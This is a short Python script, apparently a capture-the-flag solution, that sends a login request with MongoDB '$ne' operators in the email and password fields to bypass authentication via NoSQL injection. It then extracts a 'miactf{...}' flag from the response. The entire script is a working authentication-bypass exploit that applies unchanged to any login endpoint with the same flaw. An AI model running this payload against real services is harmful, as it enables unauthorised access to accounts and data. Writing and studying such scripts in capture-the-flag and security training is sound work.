#!/usr/bin/python3
import requests as req
import json
import re
import sys

url = sys.argv[1]

r = req.post(url,data=json.dumps({"email": {"$ne": ""}, "password": {"$ne": ""} }), headers={'Content-Type':'application/json'})

result = re.search(r'miactf{.*}',r.text)
if result is not None:
    print(result.group(0))
